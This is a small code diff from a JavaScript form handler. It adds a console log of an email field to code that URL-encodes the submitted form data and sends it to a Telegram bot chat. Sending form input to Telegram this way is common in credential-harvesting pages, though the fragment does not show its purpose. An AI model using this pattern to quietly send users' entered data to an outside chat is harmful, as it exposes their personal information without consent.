@@ -100,6 +100,8 @@ const handleSubmit = async (e) => {
     message += `${sp}\n`
   }
 
+  console.log('Email:',ai.value)
+
   message = encodeURI(message)
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${message}`
   try {
